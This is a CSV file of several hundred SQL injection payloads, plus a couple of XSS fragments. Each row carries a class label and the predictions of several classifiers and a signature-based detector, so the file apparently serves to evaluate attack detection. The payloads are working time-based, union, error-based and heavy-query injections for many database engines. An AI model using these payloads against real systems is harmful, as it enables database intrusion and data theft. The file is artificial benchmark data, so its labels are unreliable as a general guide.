payload,class,overlap_exact,overlap_string,overlap_family,logistic_regression_raw,logistic_regression_normalized,naive_bayes_raw,naive_bayes_normalized,svm_raw,svm_normalized,signature_raw,signature_normalized
"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-3136%') or 3400=6002,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1) where 7956=7956 or sleep(5)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-7387'))) order by 1--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1))) union all select null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-2604)) as sekb where 6897=6897 or 1000=7683,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%""))) waitfor delay '0:0:5'--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"");select benchmark(5000000,md5(0x714e4153))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-2583"") where 3455=3455 or make_set(9354=9354,7185)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
confirm(2)>/,xss,0,0,0,xss,xss,xss,xss,xss,xss,benign,benign
open()>,xss,0,0,0,xss,xss,xss,xss,xss,xss,benign,benign
"-3885) where 2387=2387 union all select 2387,2387,2387,2387,2387,2387,2387#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select 'gmpn' where 8137=8137 or sleep(5))+',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4182)) as wkfh where 6145=6145 union all select 6145,6145,6145,6145,6145#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" union all select null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') as zdhq where 5586=5586;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1' where 8584=8584 order by 1#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')) as plbt where 4368=4368 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'));select (case when (8601=1220) then 8601 else 8601*(select 8601 from mysql.db) end)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""ekjs"" like ""ekjs",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'||(select 'frrk' from dual where 3145=3145 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""abcw""=""abcw",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('njge' like 'njge,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""gfwz""=""gfwz",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) as pjjz where 8384=8384 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")) order by 1#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-6165%')) union all select 5384#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2122"") as zytb where 7025=7025 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) as nsdy where 7513=7513;select * from generate_series(3267,3267,case when (3267=5900) then 1 else 0 end) limit 1--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) as imdt where 6431=6431;begin user_lock.sleep(5); end--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')) as eltx where 9955=9955 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (6518=6518,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'||(select 'mosp' where 6085=6085;waitfor delay '0:0:5'--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') where 1093=1093 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6789'||(select 'uckz' from dual where 2163=2163 union all select 2163,2163,2163,2163,2163,2163--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6108') union all select 2519,2519,2519,2519--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) where 3979=3979 rlike sleep(5)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-8143) union all select 3014--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9954"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""bifi""=""bifi",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1') where 6624=6624 and 5392=8258,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-3884"" where 8012=8012 union all select 8012,8012#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 2834=2834 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) where 9371=9371 union all select null,null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" where 7380=7380 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) where 2679=2679 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 2388=2388 union all select null,null,null,null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-9336' or 5641=9488#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-3205"") union all select 5233,5233,5233,5233#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') rlike (select * from (select(sleep(5)))vwyq)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 7548=7548;select sleep(5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1';(select * from (select(sleep(5)))srmq),sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'));select case when 2095=9074 then 1 else null end--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")) rlike (select * from (select(sleep(5)))vwyq)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1' where 4134=4134 and 1102=6300--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('kmjn'='kmjn",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-5800"") or 6872=6872 and (""tcab"" like ""tcab",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-6599"")) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
'1,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') where 3262=3262 union all select null,null,null,null,null,null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('vjnf' like 'vjnf",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""hsaw""=""hsaw",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1 where 2382=2382;(select * from (select(sleep(5)))acdk)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""rzja"" like ""rzja",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'||(select 'puco' where 2605=2605 union all select null#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"make_set(5679=9769,9769)",sqli,0,0,0,xss,xss,sqli,sqli,xss,xss,benign,benign
"-2333' union all select 9714,9714,9714--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 6843=6843 or 6793=(select 6793 from pg_sleep(5))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'yaje'='yaje",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" where 5552=5552 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-1197"")) as dfsy where 8857=8857 or 3038=3038",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"") as fkco where 8877=8877 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) union all select null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((4694=4694,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"") where 5197=5197 and elt(3114=3114,sleep(5))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2518' union all select 6818,6818,6818,6818,6818,6818#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1;select count(*) from generate_series(1,5000000)-- gqkk",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
